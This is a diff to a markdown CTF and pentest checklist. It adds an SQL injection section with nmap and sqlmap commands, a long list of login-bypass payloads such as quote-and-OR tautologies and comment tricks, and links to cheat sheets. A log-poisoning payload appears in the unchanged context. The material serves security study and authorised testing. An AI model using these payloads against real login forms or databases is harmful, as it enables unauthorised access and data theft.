@@ -72,13 +72,82 @@ Log Poisoning
 	/log/apache2/access.log&cmd=id    
 
 	
+### SQL Injection 
 [SQL Injection Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) 
+[Pentestmonkey Cheatsheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)  
+Enum using nmap
+
+    nmap -sV --script=http-sql-injection <target>  
+    
+Using jsql 
+Using sqlmap with login-page  
+Capture the request using burp suite, and save the request in a file.
+
+    sqlmap -r request.txt
+Crawl a page to find sql-injections
+
+    sqlmap -u http://example.com --crawl=1
+
+Login bypass
+
+    'or 1=1- -
+    ' or '1'=1
+    ' or '1'=1 - -
+    '–
+    ' or '1'='1
+    -'
+    ' '
+    '&'
+    '^'
+    '*'
+    ' or ''-'
+    ' or '' '
+    ' or ''&'
+    `' or ''^'``
+    `' or ''*'
+    "-"
+    " "
+    "&"
+    "^"
+    "*"
+    " or ""-"
+    " or "" "
+    " or ""&"
+    " or ""^"
+    " or ""*"
+    or true--
+    " or true--
+    ' or true--
+    ") or true--
+    ') or true--
+    ' or 'x'='x
+    ') or ('x')=('x
+    ')) or (('x'))=(('x
+    " or "x"="x
+    ") or ("x")=("x
+    ")) or (("x"))=(("x
+    
+Known Username
+
+    admin’ - -
+    admin’) - -
+    
+Using error-bases DB enumeration
+
+    Add the tick '
+    Enumerate columns  
+    
+Using order by
+
+    https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html​
+
 	 
  
 	
 	
 	
-# Resources 
+# Resources  
+
 ## Cheat Sheets 
 [SQLi cheat sheet](https://guif.re/sqli)  
 [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/Glossary.html)    
@@ -93,3 +162,6 @@ http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-
 http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html 
 http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html 
 http://www.sqlinjection.net/login/
+
+## Sources 
+https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/web 
